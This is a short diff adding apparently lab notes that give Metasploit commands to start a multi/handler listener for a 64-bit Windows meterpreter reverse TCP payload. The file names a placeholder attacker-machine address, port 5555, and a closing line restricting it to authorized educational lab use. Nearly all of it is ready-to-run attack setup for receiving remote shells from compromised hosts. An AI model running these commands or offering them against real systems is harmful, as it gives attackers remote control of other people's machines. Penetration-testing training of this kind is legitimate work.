@@ -1,0 +1,12 @@
+Metasploit Multi/Handler Listener Commands
+
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST <ZYKALI01-IP-ADDRESS>
+set LPORT 5555
+exploit
+
+Listener port: TCP 5555
+Payload: windows/x64/meterpreter/reverse_tcp
+
+Authorized educational lab use only.
